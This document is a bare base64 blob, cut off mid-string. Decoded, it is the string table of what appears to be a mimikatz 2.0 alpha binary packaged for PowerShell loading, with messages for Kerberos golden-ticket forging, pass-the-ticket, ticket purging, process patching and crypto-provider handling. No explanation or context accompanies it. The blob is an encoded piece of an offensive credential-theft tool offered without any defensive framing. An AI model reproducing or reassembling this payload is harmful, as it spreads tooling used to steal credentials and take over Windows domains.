HgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABTAGUAcgB2AGkAYwBlACAAaQBzACAAbgBvAHQAIAByAHUAbgBuAGkAbgBnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAASQBuAGMAbwByAHIAZQBjAHQAIAB2AGUAcgBzAGkAbwBuACAAaQBuACAAcgBlAGYAZQByAGUAbgBjAGUAcwAKAAAAAABRAFcATwBSAEQAAABSAEUAUwBPAFUAUgBDAEUAXwBSAEUAUQBVAEkAUgBFAE0ARQBOAFQAUwBfAEwASQBTAFQAAAAAAEYAVQBMAEwAXwBSAEUAUwBPAFUAUgBDAEUAXwBEAEUAUwBDAFIASQBQAFQATwBSAAAAAABSAEUAUwBPAFUAUgBDAEUAXwBMAEkAUwBUAAAATQBVAEwAVABJAF8AUwBaAAAAAABMAEkATgBLAAAAAABEAFcATwBSAEQAXwBCAEkARwBfAEUATgBEAEkAQQBOAAAAAABEAFcATwBSAEQAAABCAEkATgBBAFIAWQAAAAAARQBYAFAAQQBOAEQAXwBTAFoAAABTAFoAAAAAAE4ATwBOAEUAAAAAAFMAZQByAHYAaQBjAGUAcwBBAGMAdABpAHYAZQAAAAAAXAB4ACUAMAAyAHgAAAAAADAAeAAlADAAMgB4ACwAIAAAAAAAJQAwADIAeAAgAAAAJQAwADIAeAAAAAAACgAAACUAcwAgAAAAJQBzAAAAAAAlAHcAWgAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHMAdAByAGkAbgBnAF8AZABpAHMAcABsAGEAeQBTAEkARAAgADsAIABDAG8AbgB2AGUAcgB0AFMAaQBkAFQAbwBTAHQAcgBpAG4AZwBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABUAG8AawBlAG4AAAAKACAAIAAuACMAIwAjACMAIwAuACAAIAAgAG0AaQBtAGkAawBhAHQAegAgADIALgAwACAAYQBsAHAAaABhACAAKAB4ADgANgApACAAcgBlAGwAZQBhAHMAZQAgACIASwBpAHcAaQAgAGUAbgAgAEMAIgAgACgATQBhAHkAIAAyADAAIAAyADAAMQA0ACAAMAA4ADoANQA1ADoAMAA1ACkACgAgAC4AIwAjACAAXgAgACMAIwAuACAAIAAKACAAIwAjACAALwAgAFwAIAAjACMAIAAgAC8AKgAgACoAIAAqAAoAIAAjACMAIABcACAALwAgACMAIwAgACAAIABCAGUAbgBqAGEAbQBpAG4AIABEAEUATABQAFkAIABgAGcAZQBuAHQAaQBsAGsAaQB3AGkAYAAgACgAIABiAGUAbgBqAGEAbQBpAG4AQABnAGUAbgB0AGkAbABrAGkAdwBpAC4AYwBvAG0AIAApAAoAIAAnACMAIwAgAHYAIAAjACMAJwAgACAAIABoAHQAdABwADoALwAvAGIAbABvAGcALgBnAGUAbgB0AGkAbABrAGkAdwBpAC4AYwBvAG0ALwBtAGkAbQBpAGsAYQB0AHoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAG8AZQAuAGUAbwApAAoAIAAgACcAIwAjACMAIwAjACcAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBpAHQAaAAgACUAMwB1ACAAbQBvAGQAdQBsAGUAcwAgACoAIAAqACAAKgAvAAoACgAAAAoAbQBpAG0AaQBrAGEAdAB6ACgAcABvAHcAZQByAHMAaABlAGwAbAApACAAIwAgACUAcwAKAAAASQBOAEkAVAAAAAAAQwBMAEUAQQBOAAAAAAAAAD4APgA+ACAAJQBzACAAbwBmACAAJwAlAHMAJwAgAG0AbwBkAHUAbABlACAAZgBhAGkAbABlAGQAIAA6ACAAJQAwADgAeAAKAAAAAAA6ADoAAAAAAAAAAABFAFIAUgBPAFIAIABtAGkAbQBpAGsAYQB0AHoAXwBkAG8ATABvAGMAYQBsACAAOwAgACIAJQBzACIAIABtAG8AZAB1AGwAZQAgAG4AbwB0ACAAZgBvAHUAbgBkACAAIQAKAAAACgAlADEANgBzAAAAIAAgAC0AIAAgACUAcwAAACAAIABbACUAcwBdAAAAAABFAFIAUgBPAFIAIABtAGkAbQBpAGsAYQB0AHoAXwBkAG8ATABvAGMAYQBsACAAOwAgACIAJQBzACIAIABjAG8AbQBtAGEAbgBkACAAbwBmACAAIgAlAHMAIgAgAG0AbwBkAHUAbABlACAAbgBvAHQAIABmAG8AdQBuAGQAIAAhAAoAAAAKAE0AbwBkAHUAbABlACAAOgAJACUAcwAAAAAACgBGAHUAbABsACAAbgBhAG0AZQAgADoACQAlAHMAAAAKAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAgADoACQAlAHMAAABLZXJiZXJvcwAAAAB1AHMAZQByAAAAAABXAGkAbABsAHkAIABXAG8AbgBrAGEAIABmAGEAYwB0AG8AcgB5AAAAZwBvAGwAZABlAG4AAAAAAFAAdQByAGcAZQAgAHQAaQBjAGsAZQB0ACgAcwApAAAAcAB1AHIAZwBlAAAAUgBlAHQAcgBpAGUAdgBlACAAYwB1AHIAcgBlAG4AdAAgAFQARwBUAAAAAAB0AGcAdAAAAEwAaQBzAHQAIAB0AGkAYwBrAGUAdAAoAHMAKQAAAAAAbABpAHMAdAAAAAAAUABhAHMAcwAtAHQAaABlAC0AdABpAGMAawBlAHQAIABbAE4AVAAgADYAXQAAAAAAcAB0AHQAAAAAAAAASwBlAHIAYgBlAHIAbwBzACAAcABhAGMAawBhAGcAZQAgAG0AbwBkAHUAbABlAAAAawBlAHIAYgBlAHIAbwBzAAAAAABUAGkAYwBrAGUAdAAgACcAJQBzACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHMAdQBiAG0AaQB0AHQAZQBkACAAZgBvAHIAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBTAHUAYgBtAGkAdABUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFMAdQBiAG0AaQB0AFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdAAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwByAGUAYQBkAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdAAgADsAIABNAGkAcwBzAGkAbgBnACAAYQByAGcAdQBtAGUAbgB0ACAAOgAgAHQAaQBjAGsAZQB0ACAAZgBpAGwAZQBuAGEAbQBlAAoAAABUAGkAYwBrAGUAdAAoAHMAKQAgAHAAdQByAGcAZQAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4AIABpAHMAIABPAEsACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHUAcgBnAGUAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUAB1AHIAZwBlAFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHUAcgBnAGUAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUAB1AHIAZwBlAFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAASwBlAGIAZQByAG8AcwAgAFQARwBUACAAbwBmACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4AIAA6ACAAAAAAAAAACgAoAE4AVQBMAEwAIABzAGUAcwBzAGkAbwBuACAAawBlAHkAIABtAGUAYQBuAHMAIABhAGwAbABvAHcAdABnAHQAcwBlAHMAcwBpAG8AbgBrAGUAeQAgAGkAcwAgAG4AbwB0ACAAcwBlAHQAIAB0AG8AIAAxACkACgAAAG4AbwAgAHQAaQBjAGsAZQB0ACAAIQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHQAZwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFIAZQB0AHIAaQBlAHYAZQBUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwB0AGcAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAGUAeABwAG8AcgB0AAAAAAAKAFsAJQAwADgAeABdACAALQAgADAAeAAlADAAOAB4ACAALQAgACUAcwAAAAoAIAAgACAAUwB0AGEAcgB0AC8ARQBuAGQALwBNAGEAeABSAGUAbgBlAHcAOgAgAAAAAAAgADsAIAAAAAoAIAAgACAAUwBlAHIAdgBlAHIAIABOAGEAbQBlACAAIAAgACAAIAAgACAAOgAgACUAdwBaACAAQAAgACUAdwBaAAAAAAAAAAoAIAAgACAAQwBsAGkAZQBuAHQAIABOAGEAbQBlACAAIAAgACAAIAAgACAAOgAgACUAdwBaACAAQAAgACUAdwBaAAAACgAgACAAIABGAGwAYQBnAHMAIAAlADAAOAB4ACAAIAAgACAAOgAgAAAAAABrAGkAcgBiAGkAAAAKACAAIAAgACoAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAIAAgACAAIAA6ACAAJQBzAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAEUAbgBjAG8AZABlAGQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUARQBuAGMAbwBkAGUAZABUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFEAdQBlAHIAeQBUAGkAYwBrAGUAdABDAGEAYwBoAGUARQB4ADIATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFEAdQBlAHIAeQBUAGkAYwBrAGUAdABDAGEAYwBoAGUARQB4ADIATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAACUAdQAtACUAMAA4AHgALQAlAHcAWgBAACUAdwBaAC0AJQB3AFoALgAlAHMAAAAAAHQAaQBjAGsAZQB0AC4AawBpAHIAYgBpAAAAAAB0AGkAYwBrAGUAdAAAAAAAYQBkAG0AaQBuAAAAZABvAG0AYQBpAG4AAAAAAHMAaQBkAAAAawByAGIAdABnAHQAAAAAAGkAZAAAAAAAZwByAG8AdQBwAHMAAAAAAAAAAABVAHMAZQByACAAIAAgACAAIAAgADoAIAAlAHMACgBEAG8AbQBhAGkAbgAgACAAIAAgADoAIAAlAHMACgBTAEkARAAgACAAIAAgACAAIAAgADoAIAAlAHMACgBVAHMAZQByACAASQBkACAAIAAgADoAIAAlAHUACgAAAAAARwByAG8AdQBwAHMAIABJAGQAIAA6ACAAKgAAACUAdQAgAAAACgBrAHIAYgB0AGcAdAAgACAAIAAgADoAIAAAAC0APgAgAFQAaQBjAGsAZQB0ACAAOgAgACUAcwAKAAoAAAAAAAoARgBpAG4AYQBsACAAVABpAGMAawBlAHQAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAIQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAAoAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AdwByAGkAdABlAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAASwByAGIAQwByAGUAZAAgAGUAcgByAG8AcgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAASwByAGIAdABnAHQAIABrAGUAeQAgAHMAaQB6AGUAIABsAGUAbgBnAHQAaAAgAG0AdQBzAHQAIABiAGUAIAAzADIAIAAoADEANgAgAGIAeQB0AGUAcwApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIABrAHIAYgB0AGcAdAAgAGEAcgBnAHUAbQBlAG4AdAAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABTAEkARAAgAHMAZQBlAG0AcwAgAGkAbgB2AGEAbABpAGQAIAAtACAAQwBvAG4AdgBlAHIAdABTAHQAcgBpAG4AZwBTAGkAZABUAG8AUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAUwBJAEQAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAGQAbwBtAGEAaQBuACAAYQByAGcAdQBtAGUAbgB0AAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIAB1AHMAZQByACAAYQByAGcAdQBtAGUAbgB0AAoAAAAgACoAIABQAEEAQwAgAGcAZQBuAGUAcgBhAHQAZQBkAAoAAAAgACoAIABQAEEAQwAgAHMAaQBnAG4AZQBkAAoAAAAAACAAKgAgAEUAbgBjAFQAaQBjAGsAZQB0AFAAYQByAHQAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAIAAqACAARQBuAGMAVABpAGMAawBlAHQAUABhAHIAdAAgAGUAbgBjAHIAeQBwAHQAZQBkAAoAAAAgACoAIABLAHIAYgBDAHIAZQBkACAAZwBlAG4AZQByAGEAdABlAGQACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuAF8AZABhAHQAYQAgADsAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGUAbgBjAHIAeQBwAHQAIAAlADAAOAB4AAoAAAByAGUAcwBlAHIAdgBlAGQAAAAAAGYAbwByAHcAYQByAGQAYQBiAGwAZQAAAGYAbwByAHcAYQByAGQAZQBkAAAAcAByAG8AeABpAGEAYgBsAGUAAABwAHIAbwB4AHkAAABtAGEAeQBfAHAAbwBzAHQAZABhAHQAZQAAAAAAcABvAHMAdABkAGEAdABlAGQAAABpAG4AdgBhAGwAaQBkAAAAcgBlAG4AZQB3AGEAYgBsAGUAAABpAG4AaQB0AGkAYQBsAAAAcAByAGUAXwBhAHUAdABoAGUAbgB0AAAAaAB3AF8AYQB1AHQAaABlAG4AdAAAAAAAbwBrAF8AYQBzAF8AZABlAGwAZQBnAGEAdABlAAAAAAA/AAAAbgBhAG0AZQBfAGMAYQBuAG8AbgBpAGMAYQBsAGkAegBlAAAACgAJACAAIAAgAFMAdABhAHIAdAAvAEUAbgBkAC8ATQBhAHgAUgBlAG4AZQB3ADoAIAAAAAoACQAgACAAIABTAGUAcgB2AGkAYwBlACAATgBhAG0AZQAgAAAAAAAKAAkAIAAgACAAVABhAHIAZwBlAHQAIABOAGEAbQBlACAAIAAAAAAACgAJACAAIAAgAEMAbABpAGUAbgB0ACAATgBhAG0AZQAgACAAAAAAACAAKAAgACUAdwBaACAAKQAAAAAACgAJACAAIAAgAEYAbABhAGcAcwAgACUAMAA4AHgAIAAgACAAIAA6ACAAAAAAAAAACgAJACAAIAAgAFMAZQBzAHMAaQBvAG4AIABLAGUAeQAgACAAIAAgACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAAAAAoACQAgACAAIAAgACAAAAAAAAAACgAJACAAIAAgAFQAaQBjAGsAZQB0ACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAIAA7ACAAawB2AG4AbwAgAD0AIAAlAHUAAAAAAAkAWwAuAC4ALgBdAAAAAAAlAHMAIAA7ACAAAAAoACUAMAAyAGgAdQApACAAOgAgAAAAAAAlAHcAWgAgADsAIAAAAAAAKAAtAC0AKQAgADoAIAAAAEAAIAAlAHcAWgAAAG4AdQBsAGwAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAAAGQAZQBzAF8AcABsAGEAaQBuACAAIAAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBjAHIAYwAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANAAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANQAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANQBfAG4AdAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuADIAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AZQB4AHAAIAAgACAAIAAAAHIAYwA0AF8AbABtACAAIAAgACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AbQBkADQAIAAgACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AcwBoAGEAIAAgACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AaABtAGEAYwBfAG4AdAAgACAAIAAgACAAIAAAAHIAYwA0AF8AaABtAGEAYwBfAG4AdABfAGUAeABwACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AbwBsAGQAIAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AbwBsAGQAXwBlAHgAcAAAAHIAYwA0AF8AaABtAGEAYwBfAG8AbABkACAAIAAgACAAIAAAAHIAYwA0AF8AaABtAGEAYwBfAG8AbABkAF8AZQB4AHAAIAAAAGEAZQBzADEAMgA4AF8AaABtAGEAYwBfAHAAbABhAGkAbgAAAGEAZQBzADIANQA2AF8AaABtAGEAYwBfAHAAbABhAGkAbgAAAGEAZQBzADEAMgA4AF8AaABtAGEAYwAgACAAIAAgACAAIAAAAGEAZQBzADIANQA2AF8AaABtAGEAYwAgACAAIAAgACAAIAAAAHUAbgBrAG4AbwB3ACAAIAAgACAAIAAgACAAIAAgACAAIAAAAFAAUgBPAFYAXwBSAFMAQQBfAEEARQBTAAAAAABQAFIATwBWAF8AUgBFAFAATABBAEMARQBfAE8AVwBGAAAAAABQAFIATwBWAF8ASQBOAFQARQBMAF8AUwBFAEMAAAAAAFAAUgBPAFYAXwBSAE4ARwAAAAAAUABSAE8AVgBfAFMAUABZAFIAVQBTAF8ATABZAE4ASwBTAAAAUABSAE8AVgBfAEQASABfAFMAQwBIAEEATgBOAEUATAAAAAAAUABSAE8AVgBfAEUAQwBfAEUAQwBOAFIAQQBfAEYAVQBMAEwAAAAAAFAAUgBPAFYAXwBFAEMAXwBFAEMARABTAEEAXwBGAFUATABMAAAAAABQAFIATwBWAF8ARQBDAF8ARQBDAE4AUgBBAF8AUwBJAEcAAABQAFIATwBWAF8ARQBDAF8ARQBDAEQAUwBBAF8AUwBJAEcAAABQAFIATwBWAF8ARABTAFMAXwBEAEgAAABQAFIATwBWAF8AUgBTAEEAXwBTAEMASABBAE4ATgBFAEwAAABQAFIATwBWAF8AUwBTAEwAAAAAAFAAUgBPAFYAXwBNAFMAXwBFAFgAQwBIAEEATgBHAEUAAAAAAFAAUgBPAFYAXwBGAE8AUgBUAEUAWgBaAEEAAABQAFIATwBWAF8ARABTAFMAAAAAAFAAUgBPAFYAXwBSAFMAQQBfAFMASQBHAAAAAABQAFIATwBWAF8AUgBTAEEAXwBGAFUATABMAAAATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8ARQBOAEgAXwBSAFMAQQBfAEEARQBTAF8AUABSAE8AVgAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAFIAUwBBACAAYQBuAGQAIABBAEUAUwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAAoAFAAcgBvAHQAbwB0AHkAcABlACkAAABNAFMAXwBFAE4ASABfAFIAUwBBAF8AQQBFAFMAXwBQAFIATwBWAF8AWABQAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAUwBtAGEAcgB0ACAAQwBhAHIAZAAgAEMAcgB5AHAAdABvACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8AUwBDAEEAUgBEAF8AUABSAE8AVgAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARABIACAAUwBDAGgAYQBuAG4AZQBsACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBEAEgAXwBTAEMASABBAE4ATgBFAEwAXwBQAFIATwBWAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAE0AUwBfAEUATgBIAF8ARABTAFMAXwBEAEgAXwBQAFIATwBWAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAE0AUwBfAEQARQBGAF8ARABTAFMAXwBEAEgAXwBQAFIATwBWAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8ARABFAEYAXwBEAFMAUwBfAFAAUgBPAFYAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAQwBoAGEAbgBuAGUAbAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAABNAFMAXwBEAEUARgBfAFIAUwBBAF8AUwBDAEgAQQBOAE4ARQBMAF8AUABSAE8AVgAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAaQBnAG4AYQB0AHUAcgBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBSAFMAQQBfAFMASQBHAF8AUABSAE8AVgAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwB0AHIAbwBuAGcAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8AUwBUAFIATwBOAEcAXwBQAFIATwBWAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAB2ADEALgAwAAAAAABNAFMAXwBFAE4ASABBAE4AQwBFAEQAXwBQAFIATwBWAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAgAHYAMQAuADAAAAAAAE0AUwBfAEQARQBGAF8AUABSAE8AVgAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAFMARQBSAFYASQBDAEUAUwAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AVQBTAEUAUgBTAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFMARQBSAFYASQBDAEUAAAAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBfAEUATgBUAEUAUgBQAFIASQBTAEUAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXwBHAFIATwBVAFAAXwBQAE8ATABJAEMAWQAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBfAEcAUgBPAFUAUABfAFAATwBMAEkAQwBZAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAU